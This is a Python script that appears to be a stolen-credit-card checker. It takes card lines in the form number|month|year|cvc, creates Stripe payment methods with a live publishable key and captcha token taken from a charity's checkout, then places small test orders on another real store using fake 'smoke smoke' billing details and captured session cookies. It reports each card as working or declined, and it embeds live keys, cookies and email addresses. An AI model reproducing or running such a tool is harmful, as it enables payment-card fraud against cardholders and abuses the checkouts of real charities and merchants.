import requests
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#
		yy = yy.split("20")[1]
	r = requests.session()
	import requests
#
	headers = {
    'authority': 'givinghand.charity',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://givinghand.charity',
    'referer': 'https://givinghand.charity/checkout/payment-processing/?statement_id=82abc92f-9cc3-4b84-801d-1638d8140190&gateway=stripe_intent',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}
#
	data = f'type=card&billing_details[name]=DAKAR+mohamed&billing_details[email]=mhmdysybasaljbwry%40gmail.com&billing_details[address][line1]=New+York&billing_details[address][line2]=&billing_details[address][city]=New+York&billing_details[address][state]=New+York&billing_details[address][postal_code]=10080&billing_details[address][country]=US&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=38fffdc7-1875-47ca-9535-42c6cf64bcd339448f&muid=388a7dc2-6f02-40ea-9dc5-2b6eebe12b9b390487&sid=f47334a7-7060-4a6c-ba08-7e8c757e8c4eb0b0db&payment_user_agent=stripe.js%2F0c81e1259e%3B+stripe-js-v3%2F0c81e1259e%3B+card-element&referrer=https%3A%2F%2Fgivinghand.charity&time_on_page=35396&key=pk_live_51Oo8yRK1XnH7l7ooUZvgdm1OY9mZ96hwxveVZrpiMi6kg0oPDzcwWFsTij3B2MAMLaNrJOcUbkfg5wJlglbhg34N00GvOmUclN&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQZMoQ6_SJbimJiUF91jQRcoJF0tNJvxzg1yuzjDmYcidvTg_E9SuTjgUwCpSH-NmDsI-YGrKOCb0cGVVdNXMJWCjfwbJfN3CBOEiNQM96UNgz9GwU2yj5Hmnj__NLFigvDvWHki9QH4S90AOh-4mC8LwZ-6uIanaIWXtFOkleL10dJpi1jZz3sZESFJ58_pdZY1X9kTLMaH9cuIh0oTq1leZYRrmMMkMgWg3tUfI4Gd9WLhTSo1Bw1aYAMgm7LTBc3gFi27MgjaFAl1bylYd_W7CSsBsMKi7Id8-CObWpfqXr7wsjJLQ8_r2kNIXxJ2Eag2pkVdm3ZKtbFOH5JlrksGtvr0SJSybQyqq5ZDJz9WtI4ijYlK1JH4TllRw17Hoysp59_aihS-YjZNA4q1xLQZAp3-XRrZyo8aAbJcG0Pt8-ed46Ha9eN1K3W7ItGis-x-gQppaMbgahTGJmmNyuD02DpAvt2yMyp01XSmG275DLarVmLr8GEZz9v7GJGIqFX7EN3-5z9UehUM7RJLVChKItyj9gWJoK6VKP4zQM-oe7xqvG88vyHxhKPxEXw4o78OxtQp6nLiUXwgN6URAfGwugQhxyU5N1gBdl8WN35HumTQVgdojcXoal5EGwDkmNk--92S-szAIhmsX-ZTjs_ZmdXZ_ATy4_Bi6M88CMMcFfWgj4K8Tly8DKRrmn-XxoUo7CDpF5RCJB8k_n0czyQwYjwYdjrkCEbIVAca8u0tp3qhLnwbUg5DQIN8hiUEdUhfAX6vBBVBteeks3wLMQcCxDJGkQKWi9D7KDSX3GJNS2d8lU_a5gK2_Z76sb7JaU7SsgfpRyOh5OB9nTVCj-oc2KlTR3P96lIx5Ndpwl2q16b6ugm4fQIKHR-5Uv5aV3cLq3gQTKCFCZXSXMAZuYEkTXT8-QTk6fCm5ebBR9t7ctR-WOAEWaYCgqwGyy6G2DBEeCXRdk9Et7tD0KbweQikaVVnmAmCjlkLGZP2dabw2r0vbs7ar3VXK67Dy3IEeEZ3osq7ygOeVemiE41eon1-Dy5bDopVQJZ8UvSTQn1IeiTj1_zk1i2KCWMXTsp41BgY7KP4najHxDFOrUEH6yNT60ZVZ0AEF6I9PTX94SWE2_C6xKPKIK5otH8KkYuYajPrL6aNHdoCbsrycE-naTGIWhn8Yj8c5AJiSnwbVP0IUR3dUoickXVngyNtpzGrpst703ftvmxxkt4vvMCLFV3LRufu0JbXRl3eVODHICqcoIQeOZ7P6ypMfBcdpZQOEeJn1JQ9oXLsxQtvHR8BBmSYbwou-RvClQoTL28sqrq-SAm-uEuPN4B_w570ASfz0MPRCLV0GjmNFfCpZ2P58lbFaLHkDjUgALWizz6PaQZ_ZNfny_gzhw-EFAsbi31eF5P5QO-X8-77QgwV2xWchV5SEW-pBdMXo313WtMrXONToqLok3ykG3QNjUfqT7c-mOuuEaNdPqunCbb3SRMFUC6-iejQXyO8cXzqt-qt2GJyGPEmlcoUWKBHVOiO765PZzC0YLLhcS310RTv1c7KOowhJgSuNkqEnmIFdpve_ExzQrlUrW-RlDBzudSm7RMfpw8eM7nFMwVHeAbSZVC7GlXfDZspSG5KcTk2-ysnryjfnKQIuPfrsVXXXkcBsJELb79WNoMKn9diTa19I73kpN_fU-45nnDXK1vGil02T2PPWpzYqvpCv7BnpvpMLo3fLIXpn81JVpkzqtKUEq6QoexDV_JCYFYRpBacGyogc3Z1_zYrGDVqiPJf6bh8Bf37zdzmAmrfR068f8sX_GCmwdfPMGTovbii74eYQ0wqx0N3j-JPVC8htjiK8ahDuOVmPqfe9X8b-QQgbR_oLpojlptb9hqCUt8GxKJQ90RUD5CSOzVhyHe0IgAJzp4tImmUQx_HV_EJRp_ZSoybYAA2_ZDtjoaSa1Atc3x08lwNeM4idD6CA-aiSbKLhp9Odml3BBFJTd1fM9sizVuNUzfw_1vD9h-RliXfnMc0rILQ5V_dnOSHEuC1x6iNCkyRDnThss_dy5A66KQVeCmA9R_fw_Tg5T2FpVE-cHd1UQ0rwPRldLGcowPT-d64UC8uDXfgPxXao56Zd_LFjSd_UMCtJZOsX2P2IJLCDAAxFZ-BJ6NleHDOZnQgBqhzaGFyZF9pZM4DMYNvomtyqDJlNGMwNmI3onBkAA.SctVXfV0-fDz1Ih8ekYU7ZukHLeQH7gHJ_Oy9LMAM4w'

	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	try:
        	id=response.json()['id']  # 
	except:
		return '#'
#
	import requests
#
	cookies = {
    'i3CURRENCY': 'GBP',
    'i3CID': '82abc92f-9cc3-4b84-801d-1638d8140190',
    '_ga': 'GA1.1.493294315.1718885755',
    'cf_clearance': '7A.meIGIwm6W5I68bvDBAjfj0QQsmqkfc6s0Q.jcyoM-1718885756-1.0.1.1-HayspGTB8Zl.dHWSMDqcFbWZ3ux59B3MbcoY32YVm2Hn8Yydruyy8Iu1jhh33cCCAHbrlGEZw28bz5Dnda6nOQ',
    '__stripe_mid': '388a7dc2-6f02-40ea-9dc5-2b6eebe12b9b390487',
    '__stripe_sid': 'f47334a7-7060-4a6c-ba08-7e8c757e8c4eb0b0db',
    'i3d-statement': '82abc92f-9cc3-4b84-801d-1638d8140190',
    'PHPSESSID': 'u0n1hjdmskdl1tdgjo0ru72hh7',
    '_ga_L9VVPNYMBN': 'GS1.1.1718885755.1.1.1718886281.0.0.0',
}
#
	headers = {
    'authority': 'givinghand.charity',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://givinghand.charity',
    'referer': 'https://givinghand.charity/checkout/payment-processing/?statement_id=82abc92f-9cc3-4b84-801d-1638d8140190&gateway=stripe_intent',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}
#
	json_data = {
    'email': 'a45709493@gmail.com',
    'subscribeToList': True,
    'shippingAddress': {
        'id': '',
        'firstName': 'smoke',
        'lastName': 'smoke',
        'line1': '505 N Main St',
        'line2': '505 N Main St',
        'city': 'Meridian',
        'region': 'NY',
        'postalCode': '10001',
        'country': 'US',
        'phoneNumber': '2818936228',
    },
    'createNewUser': False,
    'newUserPassword': None,
    'saveShippingAddress': False,
    'makeDefaultShippingAddress': False,
    'customFormData': '{"textarea-yui_3_10_1_1_1394561158755_6106":"23"}',
    'shippingAddressId': None,
    'proposedAmountDue': {
        'decimalValue': '21',
        'currencyCode': 'AUD',
    },
    'cartToken': '2ELrsQ25aN5zH--sM0yKFgzaBXiwQ_EBajJIlhZz',
    'paymentToken': {
        'stripePaymentTokenType': 'PAYMENT_METHOD_ID',
        'token': id,
        'type': 'STRIPE',
    },
    'billToShippingAddress': True,
    'billingAddress': {
        'id': '',
        'firstName': 'smoke',
        'lastName': 'smoke',
        'line1': '505 N Main St',
        'line2': '505 N Main St',
        'city': 'Meridian',
        'region': 'NY',
        'postalCode': '10001',
        'country': 'US',
        'phoneNumber': '2818936228',
    },
    'savePaymentInfo': False,
    'makeDefaultPayment': False,
    'paymentCardId': None,
    'universalPaymentElementEnabled': True,
}
	response = requests.post('https://www.numbat.org.au/api/2/commerce/orders', cookies=cookies, headers=headers, json=json_data).json()
	try:
		ii=response['failureType']
	except:
				return 'success'
	return ii   #